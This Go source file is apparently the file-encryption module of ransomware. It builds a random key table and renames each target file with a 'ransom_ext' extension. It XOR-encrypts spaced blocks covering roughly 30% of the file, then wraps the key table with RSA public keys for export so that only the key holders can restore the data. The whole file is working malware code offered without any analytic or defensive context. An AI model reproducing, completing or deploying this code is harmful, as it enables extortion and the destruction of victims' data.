package keytab


import (
  "os"
  "io"
  mathrand "math/rand"
  cryptorand "crypto/rand"
  "crypto/sha512"
  "crypto/rsa"
  "encoding/base64"
  "unsafe"
)


// Key table size
const EncryptionKeyTabSize = 0x300000

// Max number of blocks
const MaxNumBlocks = 256
// Block size
const BlockSize = 4096

// Key1 size
const Key1Size = 0x100000
// Key2 size
const Key2Size = 0xC00


// Key table structure
type EncryptionKeyTab struct {
  Data []byte
  Hash []byte
}


// Generate key table
func GenKeyTab() *EncryptionKeyTab {

  data := make([]byte, EncryptionKeyTabSize, EncryptionKeyTabSize)
  cryptorand.Read(data)

  var keytab EncryptionKeyTab

  keytab.Data = data

  hash := sha512.Sum512_256(data)

  keytab.Hash = hash[:]

  return &keytab
}


// Encrypt file
func (keytab *EncryptionKeyTab) EncryptFilename(filename string,
                                                ransom_ext string) error {

  n1 := mathrand.Uint32()
  n2 := mathrand.Uint32()

  var ext_data [42]byte

  copy(ext_data[:32], keytab.Hash)
  ext_data[32] = 0xFF
  *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(&ext_data[33])))) = n1
  *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(&ext_data[37])))) = n2
  ext_data[41] = 0x34

  file_ext := base64.URLEncoding.EncodeToString(ext_data[:])

  new_filename := filename + "." + file_ext + "." + ransom_ext

  err := os.Rename(filename, new_filename)
  if err != nil {
    return err
  }

  // Encrypt file data
  return keytab.EvaluateFilename(new_filename, n1, n2)
}


// Encrypt file data
func (keytab *EncryptionKeyTab) EvaluateFilename(filename string,
                                                 n1 uint32,
                                                 n2 uint32) error {

  f, err := os.OpenFile(filename, os.O_RDWR, 0600)
  if err != nil {
    return err
  }

  defer f.Close()

  file_info, err := f.Stat()
  if err != nil {
    return err
  }

  file_size := file_info.Size()

  var num_blocks int = int(30 * (file_size / BlockSize) / 100)

  if file_size == 0 {
    return nil
  }

  if file_size <= BlockSize {
    num_blocks = 1
  } else if (num_blocks < 2) {
    num_blocks = 2
  } else {
    if (num_blocks > MaxNumBlocks) {
      num_blocks = MaxNumBlocks
    }
  }

  key_data1_pos := n1 % (EncryptionKeyTabSize - Key1Size)
  key_data1 := keytab.Data[key_data1_pos : key_data1_pos + Key1Size]

  key_data2_pos := n2 % (EncryptionKeyTabSize - Key2Size)
  key_data2 := keytab.Data[key_data2_pos : key_data2_pos + Key2Size]

  var buf [BlockSize]byte

  var total_pos int = 0

  var block_space int64

  if num_blocks > 1 {
    block_space = (file_size - int64(num_blocks * BlockSize)) /
                  int64(num_blocks - 1)
  } else {
    block_space = 0
  }

  for block_num := 1; block_num <= num_blocks; block_num++ {

    var file_off int64

    if block_num == 1 {
      file_off = 0
    } else if block_num == num_blocks {
      if file_size > file_off + BlockSize {
        file_off = file_size - BlockSize
      }
    } else {
      file_off += int64(block_space)
    }

    bytes_read, err := f.ReadAt(buf[:], file_off)
    if (err != nil) && (err != io.EOF) {
      return err
    }

    if bytes_read == 0 {
      break
    }

    // Encrypt block
    for i := 0; i < bytes_read; i++ {
      pos := total_pos + i
      buf[i] ^= key_data1[pos % Key1Size] ^ key_data2[pos % Key2Size]
    }

    _, err = f.WriteAt(buf[:bytes_read], file_off)
    if err != nil {
      return err
    }

    file_off += int64(bytes_read)
    total_pos += bytes_read
  }

  return nil
}


// Encrypt key table
func (keytab *EncryptionKeyTab) Export(pubkeys []*rsa.PublicKey) []byte {

  dst_data := make([]byte, 0, 2 * EncryptionKeyTabSize)

  pos := 0
  rem_len := len(keytab.Data)
  num_keys := len(pubkeys)

  i := 0

  for rem_len > 0 {

    pubkey := pubkeys[i % num_keys]

    chunk_size := pubkey.Size() - (2 * 32 + 2)
    if chunk_size > rem_len {
      chunk_size = rem_len
    }

    hash := sha512.New512_256()

    rng := cryptorand.Reader

    enc_chunk, _ := rsa.EncryptOAEP(hash, rng, pubkey,
                                    keytab.Data[pos : pos + chunk_size],
                                    nil)

    dst_data = append(dst_data, enc_chunk...)

    pos += chunk_size
    rem_len -= chunk_size
    i++
  }

  return dst_data
}


// Erase key table
func (keytab *EncryptionKeyTab) Erase() {

  // Clear key table
  for i := range keytab.Data {
    keytab.Data[i] = 0
  }

  // Clear key table hash
  for i := range keytab.Hash {
    keytab.Hash[i] = 0
  }
}
